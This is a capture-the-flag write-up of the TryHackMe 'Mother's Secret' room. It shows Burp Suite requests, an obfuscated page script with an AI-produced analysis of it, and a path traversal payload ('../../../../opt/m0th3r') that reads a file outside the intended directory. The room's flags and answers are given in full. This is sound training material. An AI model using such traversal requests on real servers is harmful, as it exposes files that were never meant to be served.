---
title: "Mother's Secret"
datePublished: Wed Feb 11 2026 17:27:56 GMT+0000 (Coordinated Universal Time)
cuid: cmliazdf3000802lbh5s44ofx
slug: mothers-secret
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1769680739575/ededef31-2ef1-4fa9-934c-a78e559e117e.png
tags: tryhackme, burpsuite, pathtraversal, ctfwriteup

---

## 🚀 Introduction

This writeup documents my journey through the **Mother's Secrets** challenge on TryHackMe, part of the DevSecOps learning path. The challenge presents a compelling scenario inspired by the 1979 sci-fi classic "Alien," where players must investigate the compromised MU-TH-UR 6000 computer system aboard the TryHackMe Cargo Star Ship (THMCSS) Nostromo.

**Challenge Objective:**  
Starting with limited "Crew Member" access, I needed to exploit web application vulnerabilities to escalate privileges to "Science Officer" level and uncover Mother's hidden secrets. This challenge tests skills in:

* Static Application Security Testing (SAST)
    
* Code analysis and reverse engineering
    
* Path traversal exploitation
    
* Authentication bypass techniques
    
* Web application enumeration
    

**Tools Used:**

* Burp Suite (for intercepting and modifying HTTP requests)
    
* Browser Developer Tools (for analyzing client-side JavaScript)
    
* Claude AI (for deobfuscating minified JavaScript)
    

The challenge emphasizes the importance of secure coding practices and demonstrates how seemingly small oversights can lead to complete system compromise.

## Ready for Take Off

Introduction

In this challenge, you will investigate the TryHackMe Cargo Star Ship (THMCSS) Nostromo, owned by the Weyland-TryHackMe Corps and its compromised computer system, MU-TH-UR 6000. Your mission is to uncover hidden secrets by exploiting vulnerabilities in the web application running on the Nostromo server. Get ready to put your code analysis and exploitation skills to the test!

  

Previous Experience

Before attempting this challenge, it would be beneficial to have completed the [SAST](https://tryhackme.com/room/sast) and [DAST](https://tryhackme.com/room/dastzap) rooms that are part of the [DevSecOps](https://tryhackme.com/r/path-action/devsecops/join) path, or have experience in analysing code and application security. 

## Mother's Secrets!

﻿﻿Introduction

Upon accessing the MU-TH-UR6000 computer, AKA Mother, you will see the Mother UI server. However, since you only have a "Crew" Member level role, you only have read access to limited resources. But there are other ways to access it. Can you find them and uncover Mother's secret?

Equipment Check

Download the files attached to this task to review the code. 

1. Explore the available endpoints of the Mother Server and try to find any clues that can reveal mother's secret.
    
2. Search for a file that contains essential information about the ship's activities.
    
3. Exploit the vulnerable code to download the secrets from the server. Can you spot the vulnerable code?
    
4. Capture all the hidden flags you encounter during your exploration. Only Mother holds this secret. 
    

Operating Manual

﻿Below are some sequences and operations to get you started. Use the following to unlock information and navigate Mother:  

* Emergency command override is 100375. Use it when accessing *Alien Loaders*. 
    
* Download the task files to learn about Mother's routes.
    
* Hitting the *routes* in the *right* order makes Mother confused, it might think you are a Science Officer!
    

**Can you guess what is /api/nostromo/mother/secret.txt?**

### Answer the questions below

1. What is the number of the emergency command override? `100375`
    
2. What is the special order number? `937`
    
3. What is the hidden flag in the Nostromo route? `Flag{X3n0M0Rph}`  
      
    Using Burpsuite:  
      
    Allow the browser, then open the browser: `http://<IP_Address>`. Go back to BurpSuite and select one and send it to the repeater, then make the changes below, then click send.’.  
      
    `POST /yaml HTTP/1.1`  
    `HOST: IP_Address`
    
    `Content-Type: application/json`
    
    `Content-Length: 31`  
    `“file_path”:”100375.yaml”`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769678640209/5b955029-63ce-4212-b037-a8d2d85d3c7d.png align="center")
    
      
      
    
4. What is the name of the Science Officer with permissions? `Ash`  
      
    Looking through the site on the browser: `http://IP_Address` there’s an index.min.js file on the script tag. I asked Claude to help convert the min.js file to a JS file, but it opted to interpret it into a markdown file, which helped us get to understand the script, the classified flag, Ash, and 937
    
    ```bash
    const _0x267948=_0x42b1;(function(_0x393fcf,_0x4cd75b){const _0xb3790a=_0x42b1,_0x9d637f=_0x393fcf();while(!![]){try{const _0x407b49=-parseInt(_0xb3790a(0x10a))/0x1+parseInt(_0xb3790a(0x105))/0x2*(parseInt(_0xb3790a(0x112))/0x3)+parseInt(_0xb3790a(0x106))/0x4+-parseInt(_0xb3790a(0x107))/0x5+parseInt(_0xb3790a(0xdf))/0x6*(parseInt(_0xb3790a(0xea))/0x7)+-parseInt(_0xb3790a(0xe9))/0x8+-parseInt(_0xb3790a(0x109))/0x9;if(_0x407b49===_0x4cd75b)break;else _0x9d637f['push'](_0x9d637f['shift']());}catch(_0x2c5519){_0x9d637f['push'](_0x9d637f['shift']());}}}(_0x5f26,0xd18ff));const socket=io(_0x267948(0xf4));function _0x42b1(_0x5c1e5b,_0x36d94d){const _0x5f26ef=_0x5f26();return _0x42b1=function(_0x42b1b0,_0x228538){_0x42b1b0=_0x42b1b0-0xdf;let _0x5211b3=_0x5f26ef[_0x42b1b0];return _0x5211b3;},_0x42b1(_0x5c1e5b,_0x36d94d);}let authYaml=![],authNostromo=![];const yamlSocket=io('/yaml'),nostromoSocket=io(_0x267948(0xe1)),authWebSocket=()=>{const _0x156a2c=_0x267948;yamlSocket['on'](_0x156a2c(0xe4),()=>{const _0x4307e0=_0x156a2c;console[_0x4307e0(0xf6)](_0x4307e0(0x10b));}),yamlSocket['on'](_0x156a2c(0x10d),_0x4cb35d=>{authYaml=!![];if(authNostromo&&authYaml)modifyData();}),yamlSocket['on']('disconnect',()=>{const _0x39da50=_0x156a2c;console['log'](_0x39da50(0x111));}),nostromoSocket['on'](_0x156a2c(0xe4),()=>{const _0x502a33=_0x156a2c;console[_0x502a33(0xf6)](_0x502a33(0x100));}),nostromoSocket['on'](_0x156a2c(0xf7),_0x48d569=>{authNostromo=!![];if(authNostromo&&authYaml)modifyData();}),nostromoSocket['on'](_0x156a2c(0x110),()=>{const _0x29c790=_0x156a2c;console[_0x29c790(0xf6)](_0x29c790(0xe2));});};authWebSocket();const modifyData=()=>{const _0x3f3ee3=_0x267948;contentx[0x2]=_0x3f3ee3(0xf0),contentx[0x3]=atob(_0x3f3ee3(0xec)),document['querySelector'](_0x3f3ee3(0xf1))[_0x3f3ee3(0x101)]=_0x3f3ee3(0xf0);};let totalCustomDotsContainer=0x20,totalCustomDots=0x2a;function siteTemp(){const _0x53a321=_0x267948;return _0x53a321(0xfb);}((()=>{const _0x420c72=_0x267948,_0x36458a=document[_0x420c72(0xf2)](_0x420c72(0x102)),_0x4918de=[];for(let _0x36719e=0x0;_0x36719e<totalCustomDotsContainer;_0x36719e++){let _0x415735='';for(let _0x2af50d=0x0;_0x2af50d<totalCustomDots;_0x2af50d++){_0x415735+=_0x420c72(0xf3);}if(_0x36719e===0x5)_0x4918de['push'](siteTemp());_0x4918de[_0x420c72(0x108)](_0x420c72(0xfd)+_0x415735+_0x420c72(0x113));}_0x36458a['insertAdjacentHTML'](_0x420c72(0x10f),_0x4918de[_0x420c72(0xe8)](''));})());const allBoxes=document[_0x267948(0xff)](_0x267948(0xf5)),arrow=_0x267948(0xef),removeArrow=()=>{const _0x43b4b2=_0x267948;allBoxes[_0x43b4b2(0x10e)](_0x5061c2=>{const _0x1d74ff=_0x43b4b2;_0x5061c2[_0x1d74ff(0x101)]='';});},boxes=[_0x267948(0xe5),_0x267948(0xe0),_0x267948(0x104),_0x267948(0xfe)];let contentx=[_0x267948(0xe3),_0x267948(0xee),_0x267948(0xf8),atob(_0x267948(0xfa))];function _0x5f26(){const _0x491022=['Embedded\x20within\x20the\x20intricate\x20codes\x20of\x20Mother\x27s\x20system\x20lies\x20the\x20Alien\x20Loader,\x20a\x20peculiar\x20YAML\x20loader\x20function.\x20This\x20function\x20parses\x20and\x20loads\x20YAML\x20data.\x20Be\x20cautious,\x20as\x20this\x20loader\x20holds\x20the\x20truths\x20to\x20unveil\x20the\x20hidden\x20paths.','connect','Alien\x20Loader','addEventListener','<p>','join','12783888REfoSA','452151GTewca','</p>','VEhNX0ZMQUd7MFJEM1JfOTM3fQ==','keyCode','[!]CAUTION[!]\x20The\x20Nostromo\x20holds\x20countless\x20winding\x20corridors\x20and\x20concealed\x20chambers,\x20harboring\x20secrets\x20that\x20lie\x20beyond\x20the\x20intended\x20boundaries.\x20Embrace\x20the\x20power\x20of\x20relative\x20file\x20paths\x20within\x20MOTHER,\x20to\x20uncover\x20SECRETS\x20and\x20traverse\x20the\x20labyrinthine\x20structure\x20of\x20the\x20ship\x20and\x20reach\x20your\x20desired\x20destinations.','\x0a<div\x20class=\x22absolute\x20top-[50%]\x20-right-[51px]\x20w-[51px]\x20flex\x20items-center\x20justify-center\x22>\x0a<p\x20class=\x22theme-line\x20w-[51px]\x22></p>\x0a</div>\x0a','Ash','.crew-member','querySelector','<p\x20class=\x22custom-dots__dots\x22></p>','/yaml','.button-box','log','nostromo','Crew\x20Member','.content-placeholder','Q0xBU1NJRklFRA==','\x0a\x20<div\x20class=\x22special-grid\x22>\x0a\x20\x20<div\x0a\x20\x20class=\x22w-full]\x20rounded-lg\x20flex\x20items-center\x20z-20\x20p-3\x20pb-0\x20\x20shadow-lg\x20flex-1\x22\x0a\x20\x20>\x0a\x20\x20<div\x20class=\x22flex\x20flex-col\x20w-[30%]\x20justify-between\x20h-full\x20mr-[50px]\x20text-center\x22>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22top\x22\x0a\x20\x20\x20\x20>\x20\x0a\x20\x20\x20\x20<div\x20class=\x22absolute\x20top-[50%]\x20-right-[51px]\x20w-[51px]\x20flex\x20items-center\x20justify-center\x22>\x0a\x20\x20\x20\x20\x20\x20<p\x20class=\x22theme-line\x20w-[51px]\x22></p>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20Alien\x20Loader\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22bottom\x22\x0a\x20\x20\x20\x20>\x20Pathways\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22left\x22\x0a\x20\x20\x20\x20>\x20Role\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22right\x22\x0a\x20\x20\x20\x20>\x20Flag\x20</div>\x0a\x20\x20</div>\x0a\x20\x20<div\x20class=\x22flex\x20justify-center\x20flex-1\x20h-[20rem]\x20overflow-y-auto\x20descr-box\x20\x09\x20overflow-x-hidden\x20theme-green\x22>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22\x20rounded-lg\x20py-2\x20px-4\x20\x20flex\x20gap-4\x20items-center\x20justify-center\x20mr-1\x22\x0a\x20\x20\x20\x20>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22content-placeholder\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Embedded\x20within\x20the\x20intricate\x20codes\x20of\x20Mother\x27s\x20system\x20lies\x20the\x20Alien\x20Loader,\x20a\x20peculiar\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20YAML\x20loader\x20function.\x20This\x20function\x20parses\x20and\x20loads\x20YAML\x20data.\x20Be\x20cautious,\x20as\x20this\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20loader\x20holds\x20the\x20truths\x20to\x20unveil\x20the\x20hidden\x20paths.\x0a\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x20\x20</div>\x0a\x20\x20<div\x20class=\x22flex\x20w-full\x20mx-auto\x20items-center\x20z-20\x20gap-2\x20pl-2\x20shadow-lg\x20theme-color\x22\x20>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>Use</p>\x0a\x20\x20\x20\x20<b\x20class=\x22text-xl\x22>UP</b>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>and</p>\x0a\x20\x20\x20\x20<b\x20class=\x22text-xl\x22>DOWN</b>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>keys\x20to\x20move.</p>\x0a\x20\x20</div>\x0a</div>\x0a\x20\x20','keydown','<div\x20class=\x22custom-dots\x22>','Flag','querySelectorAll','Connected\x20to\x20/nostromo\x20route','innerHTML','.dots-container','which','Role','2YXlRBI','6035552fsqHMF','769345BuEAYr','push','4122108yFVOqX','327550PsrtFg','Connected\x20to\x20/yaml\x20route','insertAdjacentHTML','yaml','forEach','afterbegin','disconnect','Disconnected\x20from\x20/yaml\x20route','1591329qUpoub','</div>','126GvQOEt','Pathways','/nostromo','Disconnected\x20from\x20/nostromo\x20route'];_0x5f26=function(){return _0x491022;};return _0x5f26();}const addArrow=_0x1005d3=>{const _0x1094b2=_0x267948;let _0x205dbb=contentx;const _0x48ef0b=document[_0x1094b2(0xf2)](_0x1094b2(0xf9));allBoxes[_0x1094b2(0x10e)]((_0x5b4433,_0x40d7ad)=>{const _0x1e5f91=_0x1094b2;_0x5b4433['innerHTML']=boxes[_0x40d7ad],_0x1005d3==_0x40d7ad&&(_0x5b4433[_0x1e5f91(0x10c)](_0x1e5f91(0x10f),arrow),_0x48ef0b[_0x1e5f91(0x101)]='',_0x48ef0b[_0x1e5f91(0x10c)](_0x1e5f91(0x10f),_0x1e5f91(0xe7)+_0x205dbb[value]+_0x1e5f91(0xeb)));});};let value=0x0;document[_0x267948(0xe6)](_0x267948(0xfc),function(_0x24853f){const _0x31f3e6=_0x267948;var _0x4fa5b9=_0x24853f[_0x31f3e6(0xed)]||_0x24853f[_0x31f3e6(0x103)];switch(_0x4fa5b9){case 0x26:value=value-0x1;if(value<0x0)value=0x0;removeArrow(),addArrow(value);break;case 0x28:value=value+0x1;if(value>0x3)value=0x3;removeArrow(),addArrow(value);break;default:return;}});
    ```
    
5. What are the contents of the classified "Flag" box? `THM_FLAG{0RD3R_937}`
    
    ````bash
    # 🚨 CRITICAL FINDINGS - Mother's Secret Challenge
    
    ## 🎯 FLAGS DISCOVERED
    
    ### Flag 1 (Hidden in JS):
    **Encoded:** `VEhNX0ZMQUd7MFJEM1JfOTM3fQ==`
    **Decoded:** `THM_FLAG{0RD3R_937}`
    **Location:** Revealed when both YAML and Nostromo routes are authenticated
    
    ### Flag 2 (Initial State):
    **Encoded:** `Q0xBU1NJRklFRA==`
    **Decoded:** `CLASSIFIED`
    **Location:** Default flag display before authentication
    
    ---
    
    ## 🔐 AUTHENTICATION MECHANISM
    
    The JavaScript reveals a **WebSocket-based authentication system**:
    
    ### How Authentication Works:
    
    1. **YAML Route Authentication:**
       - When you POST to `/__api__/yaml`, it triggers a WebSocket event
       - The event `'yaml'` sets `authYaml = true` on the client side
    
    2. **Nostromo Route Authentication:**
       - When you POST to `/__api__/nostromo`, it triggers a WebSocket event  
       - The event `'nostromo'` sets `authNostromo = true` on the client side
    
    3. **Trigger Condition:**
       ```javascript
       if (authNostromo && authYaml) {
         modifyData();  // This reveals the flag!
       }
       ```
    
    4. **What modifyData() Does:**
       - Changes Role from "Crew Member" → "Ash" (Science Officer!)
       - Changes Flag from "CLASSIFIED" → `THM_FLAG{0RD3R_937}`
    
    ---
    
    ## 📋 ATTACK SEQUENCE
    
    ### Step 1: Authenticate YAML
    ```bash
    POST /__api__/yaml
    Content-Type: application/json
    
    {
      "file_path": "something.yaml"
    }
    ```
    **What happens:** WebSocket emits 'yaml' event → `authYaml = true`
    
    ### Step 2: Authenticate Nostromo
    ```bash
    POST /__api__/nostromo  
    Content-Type: application/json
    
    {
      "file_path": "any_file.txt"
    }
    ```
    **What happens:** WebSocket emits 'nostromo' event → `authNostromo = true` → Triggers `modifyData()`
    
    ### Step 3: Access Mother's Secret
    ```bash
    POST /__api__/nostromo/mother
    Content-Type: application/json
    
    {
      "file_path": "secret.txt"
    }
    ```
    **What happens:** Server reads from `./mother/secret.txt` and returns the content
    
    ---
    
    ## 🎭 ROLE CHANGE
    
    **Before Authentication:**
    - Role: "Crew Member"
    - Flag: "CLASSIFIED"
    
    **After Authentication (Both routes):**
    - Role: "Ash" (Science Officer - the android!)
    - Flag: "THM_FLAG{0RD3R_937}"
    
    ---
    
    ## 💡 KEY INSIGHTS
    
    1. **WebSocket Communication:** The authentication happens via WebSocket events, not just HTTP responses
    2. **Client-Side Flag:** The first flag (`THM_FLAG{0RD3R_937}`) is actually embedded in the client-side JavaScript
    3. **Order Matters:** You must authenticate BOTH routes before the flag is revealed
    4. **Science Officer Access:** The whole challenge is about becoming "Ash" (Science Officer) to access Mother's secrets
    5. **Path Traversal Vulnerability:** The routes don't properly sanitize file paths - use `../` to navigate the filesystem
    
    ---
    
    ## 🔍 NEXT STEPS
    
    1. ✅ Found Flag 1: `THM_FLAG{0RD3R_937}` (from JavaScript)
    2. 🎯 Still need: The actual content of `secret.txt` from Mother's directory
    3. 🛠️ Method: Use path traversal in the POST requests to access `secret.txt`
    
    ---
    
    ## 🎬 ALIEN REFERENCE
    
    The challenge is themed after the 1979 film "Alien":
    - **Nostromo** = The spaceship
    - **Mother** = The ship's AI computer
    - **Ash** = The android Science Officer (secretly working for the company)
    - **"Science Officer Eyes Only"** = Restricted access level
    
    In the movie, Ash has special access to Mother's systems that the crew doesn't have. This challenge mirrors that!
    ````
    
6. Where is Mother's secret? `/opt/m0th3r`  
      
    `POST /api/nostromo/mother HTTP/1.1`  
    `HOST: IP_Address`
    
    `Content-Type: application/json`
    
    `Content-Length: 30`  
    `“file_path”:”secret.txt”`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769678524552/5f962c0a-5df7-4e88-968d-b0275e003a67.png align="center")
    
      
    
7. What is Mother's secret? `Flag{Ensure_return_of_organism_meow_meow!}`  
      
    `POST /api/nostromo/mother HTTP/1.1`  
    `HOST: IP_Address`
    
    `Content-Type: application/json`
    
    `Content-Length: 31`  
    `"file_path":"../../../../opt/m0th3r"`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769678487264/4a0dd687-1bd2-4c59-b9b8-35237b2b6152.png align="center")